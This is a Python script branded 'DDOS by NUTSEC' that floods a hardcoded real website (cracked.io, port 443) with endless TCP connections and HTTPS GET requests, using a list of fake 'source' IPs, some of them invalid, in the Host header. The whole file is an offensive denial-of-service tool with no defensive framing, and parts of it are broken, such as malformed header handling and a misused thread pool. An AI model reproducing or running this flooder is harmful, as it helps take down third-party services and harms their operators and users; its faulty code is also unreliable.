#!/usr/bin/python3

import socket
import threading
import requests
import os
from concurrent.futures import ThreadPoolExecutor
from termcolor import colored
import time
import pyfiglet
import argparse
import random
from datetime import datetime
from art import text2art


headers_useragents = []

# random ip's
ip_s = ['173.256.12.1','142.167.32.122','142.192.1.145','45.77.180.10',
	'185.216.27.142','172.456.2.120','185.228.168.9','185.228.168.10',
	'217.169.20.23','167.32.122.900','185.228.169.168','51.89.22.36',
	'217.169.20.22','172.64.105.36','114.115.240.175','118.24.208.197',
	'172.65.3.223','80.156.145.201','51.15.124.208','45.153.187.96',
	'188.60.252.16','208.67.220.220','208.67.222.123','208.67.220.123',
	'190.167.2.122','208.67.222.222','172.217.3.78','206.189.215.75',
	'178.921.12.122','31.13.67.35','172.217.3.78','208.67.222.222',
	'8.8.8.8','9.9.9.9','0.0.0.0','80.80.80.80','208.67.220.123','1.1.1.1',
	'217.890.2.222','31.13.67.174','75.102.22.53','75.102.22.53',
	'192.168.1.1','206.189.215.75','75.102.22.53','75.102.22.53'
	]

a = datetime.now()
t1 = "%s:%s:%s" % (a.minute, a.second, str(a.microsecond)[:2])


def banner():
        os.system("clear")
        banner = text2art("DDOS by NUTSEC")
        print(colored(banner,'red'))
        print(colored("\t\t\t # Created By M3Y",'red'))
        print("\n"+t1)


attack_num = 0

def net(target,port):
	try:
		while True:
			try:
				fake_ip = random.choice(ip_s)
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((target,port))
				s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'),(target, port))
				s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

			except socket.gaierror:
				pass

			except ConnectionRefusedError:
				pass

			except ConnectionResetError:
				pass
			global attack_num
			attack_num += 1
			print(colored("Target {} and port {} and Packets {}".format(target,port,attack_num),'green'))
			s.close()
	except TimeoutError:
		pass

def user_agents():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NE>')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')

	return headers_useragents


def http(t):
	# GET  REQUEST
	while True:
              headers = headers_useragents
              try:
                   request = requests.get('https://'+t,stream=True,headers=headers)
              except:
                   pass

def main():
        banner()

	
       	ip = "cracked.io"
        p = 443
        t1 = threading.Thread(target=net,args=(ip,p,))
        t1.start()
        http(ip)

        with ThreadPoolExecutor(max_workers=10000) as pool:
             pool.map(t1)

if __name__ == "__main__":
	main()
